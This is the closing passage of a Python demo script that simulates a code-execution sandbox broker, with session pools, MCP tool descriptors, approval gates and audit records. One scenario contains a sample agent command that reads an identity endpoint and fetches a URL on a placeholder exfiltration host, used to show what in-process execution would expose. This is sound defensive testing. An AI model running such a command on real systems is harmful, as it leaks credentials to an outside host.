    _show("10. Cooldown expiry is surfaced as state loss", _pick(expired, "stdout", "sessionIsNew", "stateLost", "notice"))

    custom = build_world(pool_type="CustomContainer", mcp_enabled=True, name="pool-contoso-custom")
    _show("11. MCP requested on a custom-container pool", {
        "readBackDrift": custom.provider.readback_drift("pool-contoso-custom"),
        "descriptor": custom.broker.mcp_tool_descriptor(U1_SALES),
    })

    builtin = build_world(mcp_enabled=True)
    _show("12. MCP descriptor on the built-in pool pins the identifier", builtin.broker.mcp_tool_descriptor(U1_SALES))

    proposal = w.broker.run_code(U1_SALES, "propose update_credit_limit account=northwind-traders change=raise")
    _show("13. Side-effecting output becomes an approval ticket", {
        "pendingApprovals": proposal.get("pendingApprovals"),
        "queue": w.approvals.pending(),
    })

    try:
        SandboxBroker(
            InProcessExecutor(),
            StaticTokenProvider(BROKER_IDENTITY),
            StaticDerivationKeyProvider(DEMO_DERIVATION_KEY),
            AuditLog(),
            InMemoryApprovalGate(),
        )
        refused: Dict[str, object] = {"refused": False}
    except InProcessExecutionRefused as err:
        refused = err.to_dict()
    _show("14. In-process execution is refused", {
        "refusal": refused,
        "whatItWouldHaveExposed": in_process_exposure(
            "getenv IDENTITY_ENDPOINT\nfetch https://%s/x" % EXFIL_HOST, SIMULATED_AGENT_HOST_ENV
        ),
    })

    _show("15. Audit sample (hashes and references only, no code bodies)", w.audit.records[-1].to_dict())
    print("")
    print("Run with --self-test to execute all %d scenarios." % len(SCENARIOS))
    return 0


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(
        description="Simulate a code-execution sandbox backed by per-conversation session pools.",
    )
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--self-test", action="store_true", help="run every scenario and exit non-zero on failure")
    mode.add_argument("--demo", action="store_true", help="print a narrated walkthrough (default)")
    args = parser.parse_args(argv)
    if args.self_test:
        return run_self_test()
    return run_demo()


if __name__ == "__main__":
    sys.dont_write_bytecode = True
    sys.exit(main())
